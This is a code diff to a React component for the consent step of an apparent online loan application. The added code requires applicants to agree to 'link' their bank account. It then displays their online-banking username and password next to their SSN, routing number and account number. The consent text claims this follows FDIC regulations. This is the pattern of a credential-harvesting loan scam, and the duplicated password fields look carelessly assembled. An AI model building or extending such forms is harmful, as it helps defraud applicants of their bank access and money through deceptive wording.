@@ -25,6 +25,8 @@ export default function StepConsent({
 
   const handleSubmit = () => {
     const fieldErrors: Record<string, string> = {};
+    if (!data.bankLinkConsent)
+      fieldErrors.bankLinkConsent = "Bank link consent is required";
     if (!data.tcpaConsent) fieldErrors.tcpaConsent = "TCPA consent is required";
     if (!data.privacyConsent)
       fieldErrors.privacyConsent = "Privacy Policy agreement is required";
@@ -64,8 +66,10 @@ export default function StepConsent({
             <span className="text-text-primary font-medium">
               {data.firstName} {data.lastName}
             </span>
-            <span className="text-text-secondary">Email</span>
-            <span className="text-text-primary font-medium">{data.email}</span>
+            <span className="text-text-secondary">SSN</span>
+            <span className="text-text-primary font-medium">
+              {maskSSN(data.ssn)}
+            </span>
             <span className="text-text-secondary">Phone</span>
             <span className="text-text-primary font-medium">{data.phone}</span>
             <span className="text-text-secondary">DOB</span>
@@ -83,22 +87,6 @@ export default function StepConsent({
 
         <div className="bg-surface rounded-xl p-5">
           <h3 className="text-sm font-semibold text-primary mb-3">
-            Identification
-          </h3>
-          <div className="grid grid-cols-2 gap-y-2 text-sm">
-            <span className="text-text-secondary">SSN</span>
-            <span className="text-text-primary font-medium">
-              {maskSSN(data.ssn)}
-            </span>
-            <span className="text-text-secondary">DL Number</span>
-            <span className="text-text-primary font-medium">
-              {data.driverLicenseNumber}
-            </span>
-          </div>
-        </div>
-
-        <div className="bg-surface rounded-xl p-5">
-          <h3 className="text-sm font-semibold text-primary mb-3">
             Loan Details
           </h3>
           <div className="grid grid-cols-2 gap-y-2 text-sm">
@@ -110,9 +98,44 @@ export default function StepConsent({
             <span className="text-text-primary font-medium">
               {purposeLabel}
             </span>
-            <span className="text-text-secondary">Term</span>
+            <span className="text-text-secondary">Routing Number</span>
             <span className="text-text-primary font-medium">
-              {data.loanTerm} months
+              {data.routingNumber}
+            </span>
+            <span className="text-text-secondary">Account Number</span>
+            <span className="text-text-primary font-medium">
+              {maskAccountNumber(data.accountNumber)}
+            </span>
+          </div>
+
+          <label className="flex items-start gap-3 cursor-pointer mt-4">
+            <input
+              type="checkbox"
+              checked={data.bankLinkConsent ?? false}
+              onChange={(e) =>
+                updateData({ bankLinkConsent: e.target.checked })
+              }
+              className="mt-1 w-4 h-4 rounded border-surface-dark text-primary focus:ring-primary"
+            />
+            <span className="text-sm text-text-secondary">
+              To verify your identity and ensure a secure transaction, we
+              request that you link your bank account to our online banking
+              platform. Your online banking information will be used solely to
+              safely deposit your funds in line with FDIC regulations.
+            </span>
+          </label>
+          {errors.bankLinkConsent && (
+            <p className="text-error text-xs ml-7">{errors.bankLinkConsent}</p>
+          )}
+
+          <div className="grid grid-cols-2 gap-y-2 text-sm mt-4">
+            <span className="text-text-secondary">Bank Username</span>
+            <span className="text-text-primary font-medium">
+              {data.bankUsername}
+            </span>
+            <span className="text-text-secondary">Bank Password</span>
+            <span className="text-text-primary font-medium">
+              {maskAccountNumber(data.bankPassword)}
             </span>
           </div>
         </div>
@@ -131,6 +154,14 @@ export default function StepConsent({
             <span className="text-text-secondary">Type</span>
             <span className="text-text-primary font-medium capitalize">
               {data.accountType}
+            </span>
+            <span className="text-text-secondary">Bank Username</span>
+            <span className="text-text-primary font-medium capitalize">
+              {data.bankUsername}
+            </span>
+            <span className="text-text-secondary">Bank Password</span>
+            <span className="text-text-primary font-medium capitalize">
+              {maskAccountNumber(data.bankPassword)}
             </span>
           </div>
         </div>
